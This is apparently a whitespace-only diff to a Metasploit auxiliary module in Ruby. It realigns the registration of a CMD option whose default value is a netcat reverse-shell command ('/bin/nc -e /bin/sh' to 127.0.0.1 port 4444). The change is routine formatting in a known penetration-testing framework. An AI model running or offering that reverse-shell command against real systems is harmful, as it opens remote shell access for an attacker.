@@ -46,9 +46,8 @@ class Metasploit3 < Msf::Auxiliary
 
     register_options(
       [
-        OptString.new('CMD',         [ true, 'The command to run', '/bin/nc -e /bin/sh 127.0.0.1 4444'])
+        OptString.new('CMD', [ true, 'The command to run', '/bin/nc -e /bin/sh 127.0.0.1 4444'])
       ], self.class)
-
 
     deregister_options('DOMAINNAME', 'HOSTNAME', 'URL')
   end
